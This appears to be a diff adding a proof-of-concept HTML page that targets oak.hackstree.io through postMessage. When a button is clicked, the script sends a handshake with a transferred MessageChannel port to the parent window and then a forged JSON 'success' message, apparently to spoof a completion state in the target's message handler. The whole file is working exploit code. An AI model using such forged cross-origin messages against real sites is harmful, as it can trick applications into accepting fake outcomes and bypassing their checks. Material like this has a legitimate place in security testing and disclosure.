@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PostMessage PoC - Send Success</title>
+</head>
+<body style="background:black; color:white; font-family:Arial; padding:20px;">
+
+<h2>PostMessage PoC to oak.hackstree.io</h2>
+<button id="send" style="padding:10px 20px; font-size:16px;">Send Success</button>
+
+<script>
+
+
+document.getElementById("send").onclick = function () {
+    const target = "https://oak.hackstree.io";
+
+    // Create a message channel
+    const channel = new MessageChannel();
+
+    // Setup listener for responses coming from oak.hackstree.io
+    channel.port1.onmessage = function(event) {
+        console.log("Received from oak:", event.data);
+    };
+
+    // Step 1 — Send "init" or empty handshake so oak will accept the port
+    window.parent.postMessage("init", target, [channel.port2]);
+
+    // Wait 300ms then send SUCCESS
+    setTimeout(() => {
+        const payload = JSON.stringify({ message: "success" });
+        channel.port1.postMessage(payload);
+        console.log("Sent:", payload);
+    }, 300);
+};
+</script>
+
+</body>
+</html>
